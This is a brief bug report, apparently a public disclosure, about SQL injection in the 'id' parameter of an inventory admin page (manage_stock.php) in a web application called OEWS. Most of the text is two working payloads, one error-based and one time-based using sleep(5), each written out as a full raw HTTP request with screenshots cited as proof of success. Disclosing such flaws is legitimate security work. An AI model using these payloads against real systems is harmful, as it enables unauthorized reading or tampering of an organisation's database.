BUG_Author:Gear-D

Vulnerability File: /oews/admin/inventory/manage_stock.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=1' and (select 1 from(select count(*),concat(0x61626364,(select (elt(999=999,1))),0x75767778,floor(rand(0)*2))x from information_schema.plugins group by x)a)-- a

```
GET /oews/admin/inventory/manage_stock.php?id=1%27%20and%20(select%201%20from(select%20count(*),concat(0x61626364,(select%20(elt(999=999,1))),0x75767778,floor(rand(0)*2))x%20from%20information_schema.plugins%20group%20by%20x)a)--%20a HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=k7m8rkajvoev3rcu6g7qup0660
Connection: close
```

Injection success based on errors

![image](https://github.com/Gear-D/bug_report/blob/main/sql1.png)

Payload2:id=1' and (select 1 from (select(sleep(5)))a)-- a

```
GET /oews/admin/inventory/manage_stock.php?id=1%27%20and%20(select%201%20from%20(select(sleep(5)))a)--%20a HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=k7m8rkajvoev3rcu6g7qup0660
Connection: close
```

![image](https://github.com/Gear-D/bug_report/blob/main/sql2.png)
